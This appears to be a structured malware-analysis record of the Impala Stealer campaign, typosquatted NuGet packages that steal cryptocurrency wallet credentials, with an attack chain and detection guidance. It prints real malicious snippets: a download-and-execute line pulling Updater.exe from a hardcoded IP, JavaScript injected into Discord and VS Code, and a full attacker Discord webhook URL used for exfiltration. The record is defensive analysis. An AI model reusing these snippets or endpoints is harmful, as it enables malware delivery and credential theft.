package_info.package_name: Impala Stealer (multiple NuGet packages, e.g., Coinbase.Core, Anarchy.Wrapper.Net, etc.)
package_info.package_versions: All versions listed in the campaign (2023-01-03 to 2023-03-12)
package_info.why_malicious: The packages impersonate popular libraries via typosquatting and contain a malicious init.ps1 script that downloads and executes a custom stealer payload. The payload establishes persistence, auto-updates, and injects code into legitimate applications (such as Discord, VS Code, and Exodus Wallet) to steal cryptocurrency wallet credentials and exfiltrate them to an attacker-controlled Discord webhook. The campaign leverages multiple attack vectors, including registry persistence, code injection, and network exfiltration, to maximize credential theft and evade detection.

malicious_snippets.code_behavior: During package installation, the script downloads a Windows executable from a remote server and writes it to the local filesystem, then executes the downloaded file, initiating the malware infection chain.

malice_analysis.why_suspicious: The install script downloads and executes an unsigned binary from an untrusted remote server without user consent, which is a common malware delivery technique.
malice_analysis.violated_expectations: Legitimate NuGet packages may use install scripts for setup, but should never fetch and execute arbitrary remote executables, especially from untrusted sources.
malice_analysis.similar_legitimate_use: Some enterprise packages may update dependencies or tools, but only from trusted, signed sources and with user awareness.
key_indicators: Use of hardcoded external IP address

malicious_snippets.code_behavior: At runtime, the payload checks for the existence of the %USERPROFILE%\.nuget directory and terminates if not found, restricting execution to systems infected via NuGet installation.

malice_analysis.why_suspicious: Malware often includes environment checks to avoid detection or analysis and to ensure it only runs in targeted environments.
malice_analysis.violated_expectations: Legitimate software does not restrict execution based on the presence of specific package manager directories.
malice_analysis.similar_legitimate_use: Some enterprise software may check for required dependencies, but not to restrict execution to a specific infection vector.

malicious_snippets.code_behavior: At runtime, the payload creates or updates a registry Run key to point to the Updater executable, ensuring the malware is automatically executed at user logon and establishing persistence.

malice_analysis.why_suspicious: Malware commonly abuses registry Run keys to maintain persistence across reboots without user awareness.
malice_analysis.violated_expectations: Legitimate installers may register auto-start entries, but not for hidden updaters unrelated to user-facing functionality.
malice_analysis.similar_legitimate_use: Some legitimate updaters or background services use Run keys, but these are typically signed, user-approved, and clearly documented.

malicious_snippets.code_snippet: WebClient webClient = new WebClient(); File.WriteAllBytes(Paths.File, webClient.DownloadData("http://62.182.84.61/4563636/Updater.exe")); Process.Start(Paths.File);
malicious_snippets.code_behavior: At runtime, the Updater downloads the latest version of the payload from a remote server and writes it to disk, then executes the new binary, enabling malware self-update and resilience.

malice_analysis.why_suspicious: Self-updating malware is a common tactic for maintaining control, evading removal, and deploying new payloads.
malice_analysis.violated_expectations: Legitimate updaters use signed, trusted sources and require user consent for updates.
malice_analysis.similar_legitimate_use: Legitimate software updaters may download updates, but only from trusted, signed sources and with user notification.

malicious_snippets.code_snippet: var child = require('child_process').execFile; var executablePath = "C:\\ProgramData\\XboxGameBar\\RuntimeBroker.exe"; var parameters = ["-Log"]; child(executablePath, parameters, function(err, data) { console.log(err); console.log(data.toString()); });
malicious_snippets.code_behavior: At runtime, the payload injects code into Discord's modules to execute the main malware binary on Discord startup, redirecting process execution and ensuring persistence through a popular application.

malice_analysis.why_suspicious: Injecting code into third-party applications for persistence is a hallmark of malware and increases stealth by leveraging trusted processes.
malice_analysis.violated_expectations: Legitimate plugins or extensions for Discord do not launch unrelated executables or modify core modules to execute external binaries.
malice_analysis.similar_legitimate_use: Some legitimate plugins may extend Discord functionality, but never by launching unrelated system binaries.
key_indicators: Execution of unrelated binaries on app startup

malicious_snippets.code_snippet: var child = require('child_process').execFile; var executablePath = "C:\\ProgramData\\XboxGameBar\\RuntimeBroker.exe"; var parameters = ["-Log"]; child(executablePath, parameters, function(err, data) { console.log(err); console.log(data.toString()); });
malicious_snippets.code_behavior: At runtime, the payload injects code into VS Code's main JavaScript file to execute the main malware binary on VS Code startup, hijacking the developer tool's process for persistence.

malice_analysis.why_suspicious: Persistence via code injection into developer tools is highly suspicious and can evade detection by blending with legitimate processes.
malice_analysis.violated_expectations: VS Code extensions or updates should not modify core files to launch unrelated executables.
malice_analysis.similar_legitimate_use: Legitimate extensions may run within VS Code, but do not alter startup scripts to execute external binaries.
key_indicators: Code injection into VS Code core files
Execution of unrelated binaries on app startup

malicious_snippets.code_snippet: injectedCode (downloaded from https://paste.bingner.com/paste/xden6/raw) inserted after await this._loadLightningCreds();
malicious_snippets.code_behavior: At runtime, after the user logs into Exodus Wallet, the payload injects remote code (downloaded from a paste site) into the app.asar archive, which executes in the wallet context, intercepts decrypted credentials, and prepares them for exfiltration.

malice_analysis.why_suspicious: Dynamic code injection into a cryptocurrency wallet at the moment of credential decryption is highly malicious and enables direct credential theft.
malice_analysis.violated_expectations: Wallet applications should never execute unauthenticated remote code, especially in sensitive credential-handling routines.
malice_analysis.similar_legitimate_use: Legitimate wallets may update code, but only via signed, trusted updates and never by injecting remote code at runtime.
key_indicators: Remote code injection into wallet app

malicious_snippets.code_snippet: Content-Security-Policy modification to allow connect-src https://discord.com/; Addition of discord.com to wallet domains.
malicious_snippets.code_behavior: At runtime, the payload modifies Exodus Wallet's Content-Security-Policy and domain whitelist to allow outbound connections to https://discord.com, enabling exfiltration of stolen credentials to the attacker's Discord webhook.

malice_analysis.why_suspicious: Altering CSP to allow connections to attacker-controlled domains is a clear exfiltration enabler and bypasses built-in security controls.
malice_analysis.violated_expectations: Wallets should restrict outbound connections to trusted domains and maintain strict CSPs.
malice_analysis.similar_legitimate_use: Legitimate wallets may update CSPs for new features, but never to allow connections to unrelated domains like Discord.
key_indicators: Addition of Discord domain to allowed list

malicious_snippets.code_snippet: POST to https://discord.com/api/webhooks/1076330498026115102/MLkgrUiivlgAoFWyvkSpLsBE3DMaDZd9cxPK3k9XQPyh6dw55jktV6qfDgxbs5AaY7Py with message: "user's Exodus has been pwned sorry g"
malicious_snippets.code_behavior: At runtime, after successful credential theft, the injected code sends a POST request containing a notification and potentially stolen credentials to a hardcoded Discord webhook, exfiltrating sensitive data to the attacker.

malice_analysis.why_suspicious: Exfiltrating data to a public webhook is a classic sign of credential theft and data breach.
malice_analysis.violated_expectations: Legitimate software never sends sensitive data or notifications to third-party webhooks, especially without user consent.
malice_analysis.similar_legitimate_use: Some applications use webhooks for legitimate integrations, but never for exfiltrating user credentials.
key_indicators: Outbound POST request from wallet process

attack_chain.action: Malicious NuGet package is installed, triggering init.ps1 to download and execute the initial payload.
Payload checks for NuGet-specific directory to confirm infection vector.
Payload drops Updater executable and establishes persistence via registry Run key.
Updater downloads and executes the latest version of the payload from a remote server.
Payload injects code into Discord and VS Code to ensure malware runs on their startup.
Payload locates and extracts Exodus Wallet app.asar, injects remote code to steal credentials.
Payload modifies Exodus Wallet CSP and domain list to enable exfiltration to Discord.
Stolen credentials and notification are sent to attacker's Discord webhook.

behavioral_signatures: NuGet package install scripts that download and execute remote binaries from untrusted sources during installation
Creation or modification of registry Run keys referencing executables in non-standard directories (e.g., Squirrel-2021)
Code injection into Discord or VS Code modules to launch unrelated executables on application startup
Modification of Electron app archives (app.asar) in cryptocurrency wallets to inject remote code
Outbound network connections to Discord webhooks or hardcoded IPs from wallet or developer tool processes
Content-Security-Policy modifications in wallet applications to allow connections to new, untrusted domains
detection_knowledge.how_to_detect: Monitor NuGet package installations for scripts that download and execute remote binaries from untrusted sources. Detect creation or modification of registry Run keys referencing executables in suspicious directories. Watch for unauthorized modifications to Electron app archives, especially in cryptocurrency wallets. Alert on outbound connections to Discord webhooks, hardcoded IPs, or paste sites from wallet or developer tool processes. Use file integrity monitoring on Discord, VS Code, and Exodus Wallet directories for injected or modified code. Flag CSP modifications in wallet applications that allow new, untrusted domains.
